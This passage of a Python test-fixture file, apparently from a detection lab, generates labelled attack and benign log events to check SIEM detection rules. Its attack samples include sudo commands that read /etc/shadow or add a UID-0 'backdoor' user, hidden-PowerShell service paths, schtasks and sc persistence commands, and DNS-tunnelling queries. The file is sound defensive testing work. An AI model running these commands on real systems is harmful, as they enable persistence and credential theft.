        [security(4698, "A scheduled task was created", SubjectUserName="administrator", TaskName="\\Nightly Backup",
                  TaskContent="<Exec><Command>C:\\Program Files\\Backup\\backup.exe</Command></Exec>"),
         security(4699, "A scheduled task was deleted", SubjectUserName="administrator", TaskName="\\Updater",
                  TaskContent="<Exec><Command>C:\\ProgramData\\update.exe</Command></Exec>")],
    ),
    "win_sedebug_privilege_assigned": (
        [security(4672, "Special privileges assigned to new logon", SubjectUserName="administrator",
                  SubjectDomainName="LAB", PrivilegeList="SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege")],
        [security(4672, "Special privileges assigned to new logon", SubjectUserName="SYSTEM",
                  SubjectDomainName="NT AUTHORITY", PrivilegeList="SeDebugPrivilege, SeTcbPrivilege"),
         security(4672, "Special privileges assigned to new logon", SubjectUserName="WS-FIN-07$",
                  SubjectDomainName="LAB", PrivilegeList="SeDebugPrivilege, SeImpersonatePrivilege"),
         security(4672, "Special privileges assigned to new logon", SubjectUserName="jdoe", SubjectDomainName="LAB",
                  PrivilegeList="SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege")],
    ),
    "win_service_installed_suspicious_path": (
        [service_installed("WindowsSystemHealth", "C:\\ProgramData\\healthsvc.exe"),
         service_installed("UpdaterSvc", "%COMSPEC% /c powershell -nop -w hidden -File C:\\Windows\\Tasks\\u.ps1")],
        [service_installed("AcmeAgent", "\"C:\\Program Files\\Acme\\agent.exe\""),
         service_installed("WinDefend", "\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"")],
    ),
    "win_service_installed_psexec": (
        [service_installed("PSEXESVC", "%SystemRoot%\\PSEXESVC.exe"),
         service_installed("RemoteAdm", "C:\\Windows\\PSEXESVC.exe")],
        [service_installed("PsExecMonitor", "\"C:\\Program Files\\Monitoring\\psmon.exe\"")],
    ),
    "win_dns_query_long_encoded_label": (
        [win_dns_query("C:\\Users\\Public\\updater.exe", "3b1612dd272d1371.data.evil-cdn.example.org"),
         win_dns_query(POWERSHELL, "mfzwizlemfzwizlemfzwizle0a.t.example.net")],
        [win_dns_query("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "accounts.example.com"),
         win_dns_query("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "d1234567890abcdef1234.cloudfront.net")],
    ),
})
CASES["win_registry_run_key_suspicious_value"][0].append(
    win_registry_set(SYSTEM32 + "reg.exe", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
                     "C:\\ProgramData\\update.exe"))
CASES["win_schtasks_create_suspicious_action"][0].append(
    win_process(SYSTEM32 + "schtasks.exe", "schtasks.exe /create /tn \"SystemUpdate\" /tr "
                "\"C:\\ProgramData\\update.exe\" /sc onlogon /ru SYSTEM", parent=CMD))
CASES["win_service_create_user_writable_path"][0].append(
    win_process(SYSTEM32 + "sc.exe", "sc.exe create WindowsSystemHealth binPath= \"C:\\ProgramData\\healthsvc.exe\" "
                "start= auto", parent=CMD))

CASES["win_psexec_service_child_process"][0].append(
    win_process("C:\\Windows\\PSEXESVC.exe", "PSEXESVC.exe", parent=SYSTEM32 + "services.exe", user="SYSTEM",
                host="SRV-APP-02", original="psexesvc.exe"))


def auth_line(program: str, text: str, host: str = "web-01", pid: int | None = None) -> dict[str, Any]:
    """One line of /var/log/auth.log as the stack's Logstash pipeline stores it (detlab/authlog.py)."""
    tag = f"{program}[{pid}]" if pid else program
    event = authlog.parse(f"Nov 10 09:00:00 {host} {tag}: {text}")
    del event["@timestamp"]     # build() stamps every sample itself
    return event


def sudo(user: str, command: str) -> dict[str, Any]:
    return auth_line("sudo", f"{user} : TTY=pts/1 ; PWD=/home/{user} ; USER=root ; COMMAND={command}")


def ssh_failure(source: str, user: str, known: bool = True, method: str = "password") -> dict[str, Any]:
    """sshd reports a failed login. For an account the host does not have, it says "invalid user"."""
    account = user if known else f"invalid user {user}"
    return auth_line("sshd", f"Failed {method} for {account} from {source} port 50022 ssh2", pid=4242)


CASES["lnx_sudo_suspicious_command"] = (
    [sudo("deploy", "/bin/bash"), sudo("deploy", "/usr/bin/cat /etc/shadow"),
     sudo("deploy", "/usr/sbin/useradd -o -u 0 backdoor"), sudo("www-data", "/usr/bin/passwd root"),
     sudo("deploy", "/bin/chmod 777 /tmp/exploit")],
    [sudo("deploy", "/usr/bin/systemctl restart nginx"), sudo("deploy", "/usr/bin/cat /etc/passwd"),
     sudo("deploy", "/usr/bin/ls /root"),
     # A shell that sudo did not start: the same words in an sshd line
     auth_line("sshd", "Accepted publickey for deploy from 10.10.20.15 port 50022 ssh2", pid=4242),
     auth_line("sshd", "pam_unix(sshd:session): session opened for user deploy by (uid=0)", pid=4242),
     auth_line("cron", "pam_unix(cron:session): session opened for user root by (uid=0)", pid=911)],
)


def failed_logon(source: str, account: str) -> dict[str, Any]:
    return security(4625, "An account failed to log on", TargetUserName=account, IpAddress=source, LogonType="10",
                    Status="0xC000006D", SubStatus="0xC000006A")


def tunnel_query(host: str, number: int) -> dict[str, Any]:
    label = f"{number:02x}" + "6c6162746573746461746131"[:22]
    return win_dns_query("C:\\Users\\Public\\updater.exe", f"{label}.data.evil-cdn.example.org", host=host)


# Threshold rules count events. Their samples are groups: a group that must raise the alert and groups
# that must stay below it. rule key -> (alerting groups, quiet groups). A group is (group-by value, events).
BURSTS: dict[str, tuple[list[tuple[str, list[dict[str, Any]]]], list[tuple[str, list[dict[str, Any]]]]]] = {
    "win_failed_logon_burst": (
        [("203.0.113.50", [failed_logon("203.0.113.50", account)
                           for account in ["administrator", "admin", "root", "guest"] * 3])],
        [("10.10.20.31", [failed_logon("10.10.20.31", "jdoe") for _ in range(4)]),
         # Twelve failures, each from another address: no single source reaches the threshold.
         ("10.10.21.x", [failed_logon(f"10.10.21.{last}", "svc_backup") for last in range(1, 13)])],
    ),
    "win_dns_tunnel_burst": (
        [("WS-DEV-03", [tunnel_query("WS-DEV-03", number) for number in range(12)])],
        [("WS-HR-02", [tunnel_query("WS-HR-02", number) for number in range(3)])],
    ),
    "lnx_ssh_failed_login_burst": (
        [("203.0.113.77", [ssh_failure("203.0.113.77", user, known=user == "root")
                           for user in ["root", "admin", "test", "oracle"] * 3])],
        [("10.10.20.15", [ssh_failure("10.10.20.15", "deploy") for _ in range(3)]),
         # Twelve password failures, each from another address: no single source reaches the threshold.
         ("198.51.100.x", [ssh_failure(f"198.51.100.{last}", "admin", known=False) for last in range(1, 13)]),
         # A client that offers twelve keys the server does not know. No password was tried.
         ("10.10.20.16", [ssh_failure("10.10.20.16", "deploy", method="publickey") for _ in range(12)])],
    ),
}
# Single-event rules that fire on every event of a threshold rule's groups.
BURST_EVENTS_FIRE: dict[str, list[str]] = {
    "win_dns_tunnel_burst": ["win_dns_query_long_encoded_label"],
}

# Ordinary activity that belongs to no rule and must match none.
BACKGROUND: list[dict[str, Any]] = [
    win_process(SYSTEM32 + "svchost.exe", "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
                parent=SYSTEM32 + "services.exe", user="SYSTEM"),
    win_process("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer"),
    win_process(SYSTEM32 + "ipconfig.exe", "ipconfig.exe /all", parent=CMD),
    win_process(SYSTEM32 + "whoami.exe", "whoami.exe", parent=CMD),
    win_process(CMD, "cmd.exe /c dir C:\\Users\\jdoe\\Documents"),
    win_process(SYSTEM32 + "notepad.exe", "notepad.exe C:\\Users\\jdoe\\Documents\\notes.txt"),
    win_dns_query(SYSTEM32 + "svchost.exe", "time.windows.com"),
    win_file_create(WINWORD, "C:\\Users\\jdoe\\Documents\\budget.docx"),
    linux_process("/usr/bin/ls", "ls -la /var/www"),
    linux_process("/usr/bin/systemctl", "systemctl reload nginx", user="root"),
    linux_process("/usr/bin/apt-get", "apt-get update", user="root"),
    linux_process("/usr/bin/ssh", "ssh deploy@web-02 uptime"),
    linux_process("/usr/bin/tar", "tar -czf /var/backups/www.tar.gz /var/www", user="root"),
]


def build() -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
    """All attack events and all benign events, each with an ID, a timestamp and labels."""
    attack: list[dict[str, Any]] = []
    benign: list[dict[str, Any]] = []
    clock = [START]

    def stamp(event: dict[str, Any], event_id: str, case: str, rule: str, step: int = 37) -> dict[str, Any]:
        clock[0] += timedelta(seconds=step)
        out = {"@timestamp": clock[0].strftime("%Y-%m-%dT%H:%M:%S.000Z")}
        out.update(json.loads(json.dumps(event)))     # deep copy
        out["event"]["id"] = event_id
        out["labels"] = {"lab_case": case, "lab_rule": rule}
        return out

    for rule, (attacks, benigns) in CASES.items():
        for number, event in enumerate(attacks, start=1):
            attack.append(stamp(event, f"{rule}-attack-{number}", "attack", rule))
        for number, event in enumerate(benigns, start=1):
            benign.append(stamp(event, f"{rule}-benign-{number}", "benign", rule))
    for number, event in enumerate(BACKGROUND, start=1):
        benign.append(stamp(event, f"background-{number}", "benign", "background"))
    for rule, (alerting, quiet) in BURSTS.items():
        for case, groups, target in (("burst", alerting, attack), ("quiet", quiet, benign)):
            for group_number, (_value, events) in enumerate(groups, start=1):
                for number, event in enumerate(events, start=1):
                    # Events of a group follow each other closely, so the group fits the rule's time window.
                    target.append(stamp(event, f"{rule}-{case}-{group_number}-{number:02d}", case, rule, step=5))
    return attack, benign


# Events that fire a second rule on purpose: event ID -> the extra rule keys.
ALSO_FIRES: dict[str, list[str]] = {
    # PowerShell renamed to svchost.exe in a user folder is also a system process name in the wrong place.
    "win_renamed_powershell-attack-1": ["win_masquerading_system_binary_wrong_path"],
}


def expected(events: list[dict[str, Any]]) -> dict[str, list[str]]:
    """event.id -> keys of the rules that must fire on the event. Benign events expect none."""
    out: dict[str, list[str]] = {}
    for event in events:
        event_id = event["event"]["id"]
        case, rule = event["labels"]["lab_case"], event["labels"]["lab_rule"]
        own = [rule] if case == "attack" else BURST_EVENTS_FIRE.get(rule, []) if case in ("burst", "quiet") else []
        out[event_id] = sorted(own + ALSO_FIRES.get(event_id, []))
    return out


def expected_alerts() -> dict[str, list[tuple[str, ...]]]:
    """Threshold rule key -> the groups that must raise it, compared without regard to case."""
    return {rule: sorted((value.lower(),) for value, _events in alerting)
            for rule, (alerting, _quiet) in BURSTS.items()}


def alert_differences(wanted: dict[str, list[tuple[str, ...]]], actual: dict[str, list[tuple[str, ...]]]) -> list[str]:
    """One line per threshold alert that is missing or was not expected."""
    problems = []
    for rule in sorted(set(wanted) | set(actual)):
        want = {tuple(part.lower() for part in group) for group in wanted.get(rule, [])}
        got = {tuple(part.lower() for part in group) for group in actual.get(rule, [])}
        problems += [f"missed: {rule} raised no alert for {', '.join(group)}" for group in sorted(want - got)]
        problems += [f"false positive: {rule} raised an alert for {', '.join(group)}" for group in sorted(got - want)]
    return problems


def differences(wanted: dict[str, list[str]], actual: dict[str, list[str]]) -> list[str]:
    """One line per event whose rule hits differ from what is expected."""
    problems = []
    for event_id in sorted(set(wanted) | set(actual)):
        want, got = set(wanted.get(event_id, [])), set(actual.get(event_id, []))
        for rule in sorted(want - got):
            problems.append(f"missed: {rule} did not fire on {event_id}")
        for rule in sorted(got - want):
            problems.append(f"false positive: {rule} fired on {event_id}")
    return problems


def to_ndjson(events: list[dict[str, Any]]) -> str:
    return "".join(json.dumps(event, sort_keys=True, ensure_ascii=False) + "\n" for event in events)
